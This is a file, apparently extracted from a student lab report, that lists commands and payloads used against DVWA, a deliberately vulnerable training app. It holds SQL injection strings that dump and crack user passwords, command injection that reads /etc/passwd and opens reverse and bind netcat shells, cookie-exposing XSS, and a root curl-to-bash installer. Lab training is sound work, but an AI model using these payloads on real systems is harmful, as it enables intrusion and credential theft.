@@ -1,0 +1,112 @@
+Extracted DVWA Codes / Commands / Payloads
+Source: ETHICAL_LAB_REPORT.pdf
+Note: Curly quotes from the PDF have been normalized to straight quotes where needed for usability.
+
+============================================================
+Experiment 4 - DVWA Installation
+============================================================
+
+# One-line installer used in Kali terminal
+sudo bash -c "$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
+
+# Manual script download command shown on the DVWA GitHub page screenshot
+wget https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh
+
+# Make installer executable
+chmod +x Install-DVWA.sh
+
+# Run installer as root
+sudo ./Install-DVWA.sh
+
+============================================================
+Experiment 5 - DVWA SQL Injection Exploitation
+============================================================
+
+# Normal test user IDs entered in the DVWA SQL Injection input box
+1
+2
+
+# Display all users and database version
+%' or 0=0 union select null, version() #
+
+# Display database user
+1' union select null, user() #
+
+# Display database name
+1' union select null, database()
+
+# Display table names from information_schema
+%' and 1=0 union select null, table_name from information_schema.tables #
+
+# Display all columns in the users table
+%' and 1=0 union select null, concat(table_name, ':', column_name) from information_schema.columns where table_name = 'users' #
+
+# Display authentication information from users table
+%' and 1=0 union select null, concat(first_name, ':', last_name, ':', user, ':', password) from users #
+
+# Hash file format used for saving extracted credentials
+userid:password
+
+# John the Ripper command used to crack extracted DVWA password hashes
+john --format=raw-MD5 hash.txt
+
+============================================================
+Experiment 6 - DVWA Command Line Injection
+============================================================
+
+# Find IP address of the DVWA machine
+ip a
+
+# Ping command pattern entered in DVWA Command Injection input box
+ping <ip address>
+
+# Display /etc/passwd through command injection
+ipaddress; cat /etc/passwd
+
+# Netcat command entered in DVWA Command Injection input box
+<ip address> && nc -e /bin/sh <ip address> 4444
+
+# Netcat listener command used on client/attacker machine
+nc -lvnp 4444
+
+# Remote commands mentioned as executed through the Netcat session
+hostname
+who
+uname
+head
+
+============================================================
+Experiment 7 - DVWA Cross-Site Scripting (XSS)
+============================================================
+
+# Stored XSS - basic alert payload
+<script>alert("Testing XSS Exploit")</script>
+
+# Stored XSS - iframe payload
+<iframe src="https://www.saucedemo.com"></iframe>
+
+# Stored XSS - cookie alert payload
+<script>alert(document.cookie)</script>
+
+# Reflected XSS - basic alert payload
+<script>alert("XSS")</script>
+
+# DOM XSS - default parameter/dropdown value payload
+Malayalam<script>alert("Hacked");</script>
+
+============================================================
+Experiment 10 - Metasploit with DVWA Command Injection
+============================================================
+
+# Netcat bind shell command entered through DVWA
+<ip address>;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
+
+# Start Metasploit
+msfconsole
+
+# Show help
+show -h
+
+# Search modules
+search type:exploit platform:windows
+
